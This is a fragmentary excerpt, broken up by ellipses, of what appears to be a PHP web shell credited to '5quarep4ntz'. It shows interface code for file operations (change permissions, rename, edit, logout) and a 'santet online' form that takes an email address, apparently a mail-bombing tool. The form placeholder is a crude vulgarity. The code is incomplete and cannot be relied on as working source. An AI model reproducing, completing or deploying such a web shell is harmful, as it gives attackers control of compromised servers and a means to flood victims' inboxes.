...
<a class='squr_table' href='?logout'>logout</a><br><br>
</center>";
...
echo '<script> alert("CANGE PERM SUCCES !!!!!")</script><br/>';
}else{
...
echo '<script> alert("RENAME SUCCES !!!!!")</script><br/>';
}else{
...
<h3> - santet online coded by 5quarep4ntz - </h3><br><br>';
        ...
        <input type='text' name='mel' placeholder='kontol'><br>
          tipe santet </font>
         <select style='margin-top:6px;width:150px;font-family:Kelly Slab;font-size:15;background:black;color:gold;border:2px solid gold;border-radius:5px'>
        ...
        <input type='submit' name='santet' value='SANTET' style='margin-top:4px;width:100px;font-family:Kelly Slab;font-size:15;background:black;color:white;border:2px solid red;border-radius:5px'/>";
...
echo '<script> alert("EDIT SUCCES !!!!!")</script><br/>';
}else{
...
<select name="opt" style="margin-top:6px;width:120px;font-family:Kelly Slab;font-size:15;background:black;color:gold;border:2px solid gold;border-radius:5px">
...
<input type="submit" value=">" style="margin-top:6px;width:20px;font-family:Kelly Slab;font-size:15;background:black;color:gold;border:2px solid gold;border-radius:5px">
</form></center></td>
</tr>';
}
